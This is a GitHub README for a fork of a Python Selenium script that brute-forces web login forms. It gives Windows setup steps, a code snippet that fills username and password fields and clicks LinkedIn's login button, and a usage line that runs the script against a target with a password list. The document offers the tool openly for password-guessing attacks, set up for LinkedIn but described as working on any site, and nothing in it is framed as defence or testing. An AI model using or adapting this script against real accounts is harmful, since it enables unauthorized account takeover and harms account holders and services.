This Fork is Updateed old code to Python v3 and Selenium 4+

Step by Step for Installation on Windows Servers 2022

- Install Chrome : https://www.google.com/chrome/
- Install Python3 : https://www.python.org/downloads/windows/
  ✅ Check the box: "Add Python to PATH"
- Install Selenium : pip install selenium
![image](https://github.com/user-attachments/assets/fc090a1f-c411-404e-b47e-213296b3cd58)
- Download and Replace chromedriver : 
https://googlechromelabs.github.io/chrome-for-testing/#stable
Example : [chromedriver](https://storage.googleapis.com/chrome-for-testing-public/134.0.6998.165/win64/chromedriver-win64.zip)
![image](https://github.com/user-attachments/assets/d89971cc-618d-49e1-8ffd-b1c394b231bb)

- Clone the GitHub Repo
- Check with command python selenium-brute.py -h

![image](https://github.com/user-attachments/assets/7c7713b0-4532-4c42-9822-b0c68950d639)

- Run command

![image](https://github.com/user-attachments/assets/d3c487a9-81d8-4df0-8957-4c3c0f0e52a9)


---------------------------------------------------------
# Selenium-Brute-Force
A simple python script for doing brute-force attack using selenium.

## Help
- The default script is useful for Linkedin, but it works for everything. For other platforms, it needs to extract username id, password id, and login button class using browser inspector.

![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/file/help.jpg)<br />

put them in code.
```python
username = driver.find_element_by_id("username")		
username.clear()
print("username: "+curuser)
username.send_keys(curuser)		
password = driver.find_element_by_id("password")
password.clear()
print("password: "+passw+"\n")
password.send_keys(passw)			
driver.find_element_by_class_name('login__form_action_container').click()
```
- check chromedriver version (87.0) with your chrome, if there is an incompatibility, use appropriate version here <br />
https://chromedriver.chromium.org/downloads
## Usage
To get a list of basic options and switches use:
```python
selenium-brute.py -h
```
sample:
```
selenium-brute.py -t https://target.com -u admin -p pass.txt
```
![](https://github.com/mohammadkamrani/Selenium-Brute-Force/blob/main/file/video.gif)

